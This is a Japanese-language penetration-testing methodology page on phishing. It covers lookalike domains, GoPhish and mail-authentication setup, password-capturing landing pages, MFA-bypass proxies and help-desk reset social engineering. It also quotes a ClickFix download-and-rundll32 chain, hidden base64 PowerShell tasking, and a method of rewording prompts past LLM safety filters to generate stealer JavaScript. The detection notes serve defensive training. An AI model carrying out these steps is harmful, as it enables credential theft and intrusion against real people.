# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 被害者を Recon する
1. **victim domain** を選ぶ。
2. 被害者が使用している**login portals**を探して、基本的な web enumeration を行い、どれを**impersonate**するか**決める**。
3. **OSINT** を使って **emails** を見つける。
2. 環境を準備する
1. phishing assessment に使う **domain** を**購入**する
2. 関連する email service のレコード（SPF, DMARC, DKIM, rDNS）を**設定**する
3. **gophish** を使う VPS を設定する
3. campaign を準備する
1. **email template** を準備する
2. credentials を盗むための **web page** を準備する
4. campaign を開始する!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: domain name に元の domain の重要な **keyword** が**含まれる**（例: zelster.com-management.com）。
- **hypened subdomain**: subdomain の **dot を hyphen に置き換える**（例: www-zelster.com）。
- **New TLD**: 同じ domain で **new TLD** を使う（例: zelster.org）
- **Homoglyph**: domain name の文字を、**見た目が似ている文字**に置き換える（例: zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** domain name 内の **2 文字を入れ替える**（例: zelsetr.com）。
- **Singularization/Pluralization**: domain name の末尾に “s” を追加または削除する（例: zeltsers.com）。
- **Omission**: domain name から **1 文字を削除する**（例: zelser.com）。
- **Repetition:** domain name の文字のうち **1 文字を繰り返す**（例: zeltsser.com）。
- **Replacement**: homoglyph に似ているが、より stealthy ではない。domain name の文字のうち 1 つを置き換える。場合によっては、元の文字の keyboard 上で近い位置にある文字に置き換える（例, zektser.com）。
- **Subdomained**: domain name の中に **dot** を入れる（例: ze.lster.com）。
- **Insertion**: domain name に **1 文字を挿入する**（例: zerltser.com）。
- **Missing dot**: TLD を domain name の末尾に付ける。（例: zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

保存または通信中のいくつかの bit のうち 1 つが、solar flares、cosmic rays、hardware errors などのさまざまな要因で**自動的に反転する可能性**があります。

この概念を **DNS requests** に**適用**すると、**DNS server が受信した domain** が最初に要求された domain と同じではない可能性があります。

たとえば、domain "windows.com" の 1 bit を変更すると "windnws.com" に変わることがあります。

攻撃者は、被害者の domain に似た複数の bit-flipping domain を登録することで、これを**悪用**できます。その目的は、正規ユーザーを自分たちの infrastructure にリダイレクトすることです。

詳細は [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) を読んでください。

### Buy a trusted domain

[https://www.expireddomains.net/](https://www.expireddomains.net) で、使用できる expired domain を探せます。\
購入する expired domain が **すでに良い SEO** を持っていることを確認するために、以下でどのように分類されているかを確認できます:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

より多くの有効な email addresses を**見つける**、またはすでに見つけたものを**検証する**には、被害者の smtp servers に対して brute-force できるか確認してください。[email address を検証/発見する方法はこちら](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーがメールにアクセスするために**任意の web portal** を使っている場合は、**username brute force** に対して脆弱か確認し、可能ならその脆弱性を悪用してください。

## Configuring GoPhish

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) からダウンロードできます。

これを `/opt/gophish` にダウンロードして展開し、`/opt/gophish/gophish` を実行してください。\
出力に port 3333 の admin user 用 password が表示されます。そのため、その port にアクセスしてその credentials を使い、admin password を変更してください。その port を local に tunnel する必要があるかもしれません:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS certificate configuration**

Before this step you should have **already bought the domain** you are going to use and it must be **pointing** to the **IP of the VPS** where you are configuring **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

次をインストールします: `apt-get install postfix`

次に、以下のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf 内の以下の変数の値も変更します**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、**`/etc/hostname`** と **`/etc/mailname`** をドメイン名に変更し、**VPS を再起動します。**

次に、VPS の **ip address** を指す `mail.<domain>` の **DNS A record** と、`mail.<domain>` を指す **DNS MX** レコードを作成します。

では、メール送信をテストしてみましょう:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish の実行を停止し、設定します。\
`/opt/gophish/config.json` を次のように変更します（https の使用に注意してください）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophishサービスを設定する**

gophishサービスを作成して自動的に起動できるようにし、サービスとして管理するには、次の内容でファイル `/etc/init.d/gophish` を作成できます:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
サービスの設定を完了し、以下を実行して動作を確認する:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバーとドメインの設定

### Wait & be legit

ドメインが古いほど、spamとして検出される可能性は低くなります。そのため、phishing assessmentの前にできるだけ長く（少なくとも1週間）待つべきです。さらに、reputational sector に関するページを設置すると、得られる reputation はより良くなります。

1週間待つ必要がある場合でも、今のうちにすべての設定を終えておくことはできます。

### Configure Reverse DNS (rDNS) record

VPS の IP address をドメイン名に解決する rDNS (PTR) record を設定します。

### Sender Policy Framework (SPF) Record

新しいドメインに対して SPF record を**設定する必要があります**。SPF record とは何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net) を使って SPF policy を生成できます（VPS machine の IP を使用してください）

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

これは、ドメイン内の TXT record に設定する必要がある内容です:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

新しいドメインには **DMARC record を設定** する必要があります。DMARC record とは何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指す新しい DNS TXT record を作成し、以下の内容を設定してください:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

新しいドメインに対して **DKIM を設定** する必要があります。DMARC レコードが何か分からない場合は、[**このページを読む**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは次を元にしています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM キーが生成する 2 つの B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定スコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com)\ を使って確認できます。  
ページにアクセスして、表示されたアドレス宛てにメールを送信してください:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
また、`check-auth@verifier.port25.com` にメールを送信し、**応答を読む**ことで、**メール設定を確認**できます（そのためには **25** 番ポートを**開き**、root としてメールを送信した場合はファイル _/var/mail/root_ で応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
また、**自分で管理している Gmail に message を送信**し、Gmail の受信トレイで**email の headers**を確認して、`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれていることを確認できます。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouseブラックリストからの削除

[www.mail-tester.com](https://www.mail-tester.com) のページでは、あなたのドメインが spamhouse によってブロックされているかどうかを確認できます。ドメイン/IP の削除は次の場所からリクエストできます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoftブラックリストからの削除

​​ドメイン/IP の削除は [https://sender.office.com/](https://sender.office.com) からリクエストできます。

## GoPhish Campaign の作成と開始

### Sending Profile

- 送信者プロフィールを識別するための **name** を設定する
- phishing emails を送信するアカウントを決める。提案: _noreply, support, servicedesk, salesforce..._
- username と password は空欄のままでもよいが、Ignore Certificate Errors にチェックを入れていることを確認する

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正しく動作しているか確認するために、"**Send Test Email**" 機能を使ってテストすることを推奨します。\
> テストでブラックリスト入りしないよう、**テストメールは 10min mails のアドレスに送る**ことをおすすめします。

### Email Template

- テンプレートを識別するための **name** を設定する
- 次に **subject** を書く（奇妙なものではなく、通常のメールで読むと予想されるような内容にする）
- "**Add Tracking Image**" にチェックが入っていることを確認する
- **email template** を書く（次の例のように変数を使える）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **メールの信頼性を高めるために**, クライアントからのメールにある署名を使うことを推奨します。提案:

- **存在しないアドレス**にメールを送り、応答に署名があるか確認する。
- info@ex.com や press@ex.com や public@ex.com のような **公開メール** を探してメールを送り、返信を待つ。
- **見つかった有効な**メールに連絡を試みて、返信を待つ

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template では、送信するための **ファイルを添付**することもできます。特別に細工したファイル/文書を使って NTLM challenge も盗みたい場合は、[このページ](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)を読んでください。

### Landing Page

- **名前** を書く
- **Webページの HTML コード** を書く。Webページは **import** できることに注意。
- **Capture Submitted Data** と **Capture Passwords** を有効にする
- **リダイレクション** を設定する

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 通常はページの HTML コードを修正して、ローカルでいくつかテストする必要があります（たとえば Apache server を使うなど）。**結果に満足するまで**行ってください。次に、その HTML コードをボックスに書きます。\
> HTML 用に **静的リソース**（たとえば CSS や JS のページ）を使う必要がある場合は、_**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> リダイレクションでは、被害者を **正規のメイン web ページ** に転送するか、たとえば _/static/migration.html_ に転送して、5 秒間 **スピニングホイール (**[**https://loading.io/**](https://loading.io)**) を表示し、その後、処理が成功したことを示す**ことができます。

### Users & Groups

- 名前を設定する
- **データをインポート**する（例のテンプレートを使うには、各ユーザーの firstname、last name、email address が必要なことに注意）

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、sending profile、group を選択して campaign を作成します。URL は被害者に送られるリンクであることに注意してください

**Sending Profile ではテスト email を送って、最終的な phishing email がどのように見えるかを確認できる**ことに注意してください:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> テストメールは、ブラックリスト入りを避けるために **10min mail のアドレス** に送ることをおすすめします。

すべて準備できたら、campaign を開始するだけです!

## Website Cloning

何らかの理由で website を clone したい場合は、次のページを確認してください:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

いくつかの phishing assessment（主に Red Teams）では、**何らかの backdoor を含むファイルも送る**必要があります（C2 か、あるいは認証をトリガーするだけのものかもしれません）。\
例については次のページを確認してください:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述の攻撃は、実際の website を偽装してユーザーが入力した情報を収集するという点で非常に巧妙です。しかし残念ながら、ユーザーが正しい password を入力しなかった場合、または偽装したアプリケーションが 2FA に設定されている場合、**この情報だけでは騙されたユーザーになりすますことはできません**。

そこで [**evilginx2**](https://github.com/kgretzky/evilginx2)**、** [**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena) のような tool が役立ちます。この tool は MitM のような攻撃を生成できます。基本的には、攻撃は次のように動作します:

1. 実際の web page の login form を **なりすます**。
2. ユーザーが自分の **credentials** を偽の page に **送信**し、tool がそれを実際の web page に送り、**credentials が有効か確認**する。
3. account に **2FA** が設定されている場合、MitM page がそれを要求し、**ユーザーが入力**すると tool がそれを実際の web page に送る。
4. ユーザーが認証されると、あなた（攻撃者）は tool が MitM を実行している間の各やり取りの **credentials、2FA、cookie、その他の情報** をすべて **取得**できます。

### Via VNC

元のものと同じ見た目の **悪意ある page に被害者を送る**代わりに、**実際の web page に接続された browser を持つ VNC session に送る**としたらどうでしょうか? 彼が何をするかを見ることができ、password、使用された MFA、cookies... を盗めます。\
これは [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) でできます

## Detecting the detection

当然ながら、バレたかどうかを知る最善の方法の1つは、**自分の domain を blacklist 内で検索する**ことです。もし listed されていれば、どういうわけかその domain は suspicious として検出されています。\
domain が blacklist に載っているかを簡単に確認する方法の1つは [https://malwareworld.com/](https://malwareworld.com) を使うことです

しかし、被害者が **実際に wild の suspicious な phishing activity を探している**かどうかを知る他の方法もあり、次で説明されています:


{{#ref}}
detecting-phising.md
{{#endref}}

被害者の domain と **非常によく似た名前の domain を買う**、**または** 自分が管理する domain の **subdomain** に対して **証明書を生成**し、その中に被害者の domain の **keyword** を含めることができます。被害者がそれらに対して何らかの **DNS または HTTP interaction** を行えば、**彼が suspicious な domain を積極的に探している**と分かり、より stealth に振る舞う必要があります。

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious) を使って、email が spam folder に入るのか、ブロックされるのか、それとも成功するのかを評価します。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

現代の intrusion set は、email lure を完全に省略し、**service-desk / identity-recovery workflow を直接狙って** MFA を突破することが増えています。攻撃は完全に "living-off-the-land" です。operator が有効な credentials を手に入れると、組み込みの admin tooling で pivot します – malware は不要です。

### Attack flow
1. 被害者を recon する
* LinkedIn、data breaches、public GitHub などから個人および企業の詳細を収集する
* 高価値の identity（executives、IT、finance）を特定し、password / MFA reset の **正確な help-desk process** を列挙する
2. リアルタイムの social engineering
* 目的の人物になりすまして help-desk に Phone、Teams、または chat で連絡する（しばしば **spoofed caller-ID** や **cloned voice** を使用）
* 事前に収集した PII を提示して knowledge-based verification を通過する
* 担当者を説得して **MFA secret を reset** させる、または登録済み mobile number に対して **SIM-swap** を実行させる
3. 直後の post-access actions（実際の事例では ≤60 分）
* 任意の web SSO portal 経由で foothold を確立する
* built-in を使って AD / AzureAD を列挙する（binary は落とさない）:
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* **WMI**、**PsExec**、または環境内ですでに whitelist されている正規の **RMM** agents で lateral movement する

### Detection & Mitigation
* help-desk の identity recovery を **privileged operation** として扱う – step-up auth と manager approval を要求する
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rules を導入し、以下を alert する:
* MFA method changed + 新しい device / geo からの authentication
* 同じ principal の即時 elevation（user-→-admin）
* help-desk の通話を記録し、reset 前に **すでに登録されている番号への call-back** を義務付ける
* **Just-In-Time (JIT) / Privileged Access** を実装し、新しく reset された account が自動的に高権限 token を継承しないようにする

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews は、高コストな high-touch ops を、**search engines & ad networks を delivery channel に変える**大規模攻撃で相殺します。

1. **SEO poisoning / malvertising** で、`chromium-update[.]site` のような偽の結果を search ads の上位に押し上げる。
2. 被害者は小さな **first-stage loader**（多くは JS/HTA/ISO）をダウンロードする。Unit 42 が確認した例:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader は browser cookies + credential DBs を exfiltrate し、その後 **silent loader** を取得して、*リアルタイムで* 次のどれを展開するか判断する:
* RAT（例: AsyncRAT, RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* 新規登録 domain を block し、e-mail だけでなく *search-ads* に対しても **Advanced DNS / URL Filtering** を適用する。
* software installation を署名付き MSI / Store packages に制限し、policy で `HTA`、`ISO`、`VBS` の実行を拒否する。
* browser の child process が installer を開くのを監視する:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader に頻繁に悪用される LOLBins（例: `regsvr32`、`curl`、`mshta`）を hunt する。

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: 公式 CERT の通知を clone したもので、**Update** ボタンがあり、手順ごとの “fix” instructions を表示する。被害者には DLL をダウンロードして `rundll32` 経由で実行する batch を実行するよう指示される。
* 典型的な batch chain の例:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` が payload を `%TEMP%` に配置し、短い sleep で network jitter を隠し、その後 `rundll32` が export された entrypoint（`notepad`）を呼び出す。
* DLL は host identity を beacon し、数分ごとに C2 を poll する。リモート tasking は **base64-encoded PowerShell** として届き、`-WindowStyle Hidden` かつ policy bypass で実行される:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の柔軟性を維持し（server は DLL を更新せずに task を差し替えられる）、console window を隠せます。`rundll32.exe` の子として動く PowerShell、`-WindowStyle Hidden`、`FromBase64String`、`Invoke-Expression` をまとめて hunt してください。
* defenders は `...page.php?tynor=<COMPUTER>sss<USER>` の形式の HTTP(S) callback と、DLL 読み込み後の 5 分間隔の polling を確認できます。

---

## AI-Enhanced Phishing Operations
攻撃者は現在、**LLM & voice-clone APIs** を連結して、完全に個別化された lure とリアルタイムのやり取りを行います。

| Layer | Threat actor による使用例 |
|-------|-----------------------------|
|Automation|ランダム化された文面と tracking links を使って >100 k の email / SMS を生成・送信する。|
|Generative AI|公表された M&A や SNS からの内輪ネタを参照した *一回限り* の email を生成する; callback scam で CEO の deep-fake voice を使う。|
|Agentic AI|自律的に domain を登録し、open-source intel を収集し、被害者がクリックしたが credentials を送信しなかった場合に次段階の mail を作成する。|

**Defence:**
• 信頼できない automation から送信された message を強調表示する **dynamic banners** を追加する（ARC/DKIM の異常経由）。
• 高リスクの phone request に対して **voice-biometric challenge phrases** を導入する。
• AI-generated lure を awareness program で継続的にシミュレートする – static templates はもう古いです。

credential phishing のための agentic browsing abuse も参照:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

secret inventory と detection のための、ローカル CLI tools と MCP に対する AI agent abuse も参照:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻撃者は一見 benign な HTML を配布し、**信頼された LLM API** に JavaScript を生成させて、その場で stealer を **runtime で生成**できます。その後、browser 内で実行します（たとえば `eval` や dynamic `<script>`）。

1. **Prompt-as-obfuscation:** exfil URLs/Base64 strings を prompt に埋め込み、文言を繰り返し調整して safety filters を回避し、hallucinations を減らす。
2. **Client-side API call:** load 時に JS が public LLM（Gemini/DeepSeek/etc.）または CDN proxy を呼び出す; static HTML には prompt/API call だけが含まれる。
3. **Assemble & exec:** response を連結して実行する（visit ごとに polymorphic）:
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成されたコードが lure を個別化し（例: LogoKit token parsing）、creds を prompt-hidden endpoint に送信する。

**Evasion traits**
- トラフィックは well-known な LLM domains や信頼できる CDN proxies に到達する。場合によっては backend への WebSockets 経由。
- 静的な payload はない。悪意ある JS は render 後にのみ存在する。
- 非決定的な生成により、セッションごとに**unique** な stealers が生成される。

**Detection ideas**
- JS enabled の sandbox を実行し、**LLM responses 由来の runtime `eval`/dynamic script creation** を検出する。
- フロントエンドからの POST が LLM APIs に送られた直後、返された text に対して `eval`/`Function` が実行されるものを hunt する。
- client traffic における unsanctioned な LLM domains と、その後の credential POSTs にアラートを出す。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
従来の push-bombing に加えて、operator は help-desk call の最中に単に**新しい MFA registration を強制**し、user の既存 token を無効化する。その後の login prompt は victim にとって正当なものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta のイベントで、同じ IP から **`deleteMFA` + `addMFA`** が **数分以内に** 発生するものを監視する。



## Clipboard Hijacking / Pastejacking

攻撃者は、侵害された Web ページや typo squatting された Web ページから、悪意のあるコマンドを被害者のクリップボードに密かにコピーし、その後 **Win + R**、**Win + X**、またはターミナルウィンドウに貼り付けるようにユーザーをだまして、ダウンロードや添付ファイルなしで任意のコードを実行させる。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* 誘導ページ（例: 偽の ministry/CERT の「channel」）が WhatsApp Web/Desktop の QR を表示し、被害者にスキャンするよう指示して、攻撃者を **linked device** として静かに追加する。
* 攻撃者はセッションが削除されるまで、直ちにチャット/連絡先の可視性を得る。被害者は後で「new device linked」通知を見ることがある。防御側は、信頼できない QR ページへの訪問直後の予期しない device-link イベントを追跡できる。

### Mobile‑gated phishing to evade crawlers/sandboxes
運用者は、デスクトップの crawler が最終ページに到達しないよう、単純な device check の پشتに phishing の流れを置くことが増えている。一般的なパターンは、touch 対応の DOM を判定して結果をサーバーの endpoint に送信する小さな script であり、mobile 以外の client には HTTP 500（または空白ページ）を返し、mobile ユーザーには完全な流れを表示する。

最小の client snippet（典型的なロジック）:
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` のロジック（簡略化）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behavior でよく見られるもの:
- 初回ロード時に session cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- `is_mobile=false` の場合、以降の GET に対して 500（またはプレースホルダ）を返す。`true` の場合のみ phishing を配信する。

Hunting と detection heuristics:
- urlscan クエリ: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → 非 mobile では HTTP 500、正規の mobile victim paths では 200 で続けて HTML/JS を返す。
- `ontouchstart` や同様の device checks のみに条件づけて content を切り替えるページは block するか精査する。

Defence tips:
- crawlers を mobile-like fingerprints と JS enabled で実行し、gated content を露出させる。
- 新規登録ドメインで `POST /detect` の後に suspicious な 500 responses があれば alert を出す。

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
